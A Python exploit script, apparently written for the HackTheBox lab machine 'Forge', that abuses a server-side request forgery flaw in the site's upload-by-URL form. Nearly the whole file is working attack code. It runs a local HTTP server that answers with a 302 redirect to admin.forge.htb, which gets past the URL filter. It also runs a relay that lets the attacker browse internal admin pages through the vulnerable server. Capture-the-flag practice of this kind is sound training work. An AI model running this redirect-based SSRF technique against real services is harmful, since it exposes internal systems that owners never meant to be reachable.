import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler

import requests
from bs4 import BeautifulSoup
import multiprocessing
import netifaces

my_ip = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
abuse_url = "http://forge.htb/upload"
server_port = 8000
relay_port = 3334
forward_url = 'http://admin.forge.htb'

def initialize_request():
    headers = {'Host': 'forge.htb',
               'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
               'Accept-Language': 'pl,en-US;q=0.7,en;q=0.3',
               'Accept-Encoding': 'gzip, deflate',
               'Referer': 'http://forge.htb/upload',
               'Content-Type': 'application/x-www-form-urlencoded',
               'Content-Length': '169',
               'Origin': 'http://forge.htb',
               'Connection': 'close'}
    payload = f"url=http://{my_ip}:{server_port}&remote=0"
    print(payload)
    r = requests.post(abuse_url, headers=headers, data=payload, proxies={'http': 'http://127.0.0.1:8080'})
    return get_abused_page_content(r.text)


def get_abused_page_content(text):
    soup = BeautifulSoup(text, features="html.parser")
    try:
        parsed = soup.find_all('body')[0].find_all('h1')[3].find('center').find('strong').find('a')['href']
    except IndexError:
        return ""

    with urllib.request.urlopen(parsed) as f:
        html = f.read().decode('utf-8')

    return html

class MyProxy(BaseHTTPRequestHandler):
    forward_url_path = ''

    def do_GET(self):
        global forward_url, forward_url_path
        self.send_response(302)
        location = f'{forward_url}{forward_url_path}'
        self.send_header('Location', location)
        self.end_headers()

    def do_POST(self):
        global forward_url_path
        self.send_response(200)
        self.end_headers()
        content_length = int(self.headers['Content-Length'])
        forward_url_path = self.rfile.read(content_length).decode('utf-8')
        print(forward_url_path)


class MyRelay(BaseHTTPRequestHandler):
    def do_GET(self):
        global forward_url_path
        forward_url_path = self.path

        requests.post(f'http://127.0.0.1:{server_port}', headers={'Content-Length': f'{len(forward_url_path)}'}
                      , data=forward_url_path)

        r = initialize_request()
        if r == "":
            self.send_response(404)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(bytes(r, "utf8"))



def serve_forever(httpd):
    with httpd:
        httpd.serve_forever()


def init_http_server():
    http_server = HTTPServer(("0.0.0.0", server_port), MyProxy)
    http_server.timeout = 0.5
    http_server.allow_reuse_address = True
    return multiprocessing.Process(target=serve_forever, args=(http_server,))


def init_relay_server():
    http_server = HTTPServer(("0.0.0.0", relay_port), MyRelay)
    http_server.timeout = 0.5
    http_server.allow_reuse_address = True
    return multiprocessing.Process(target=serve_forever, args=(http_server,))


def main():
    global server_port
    global forward_url
    http_proc = init_http_server()
    http_proc.start()
    relay_proc = init_relay_server()
    relay_proc.start()


if __name__ == "__main__":
    main()
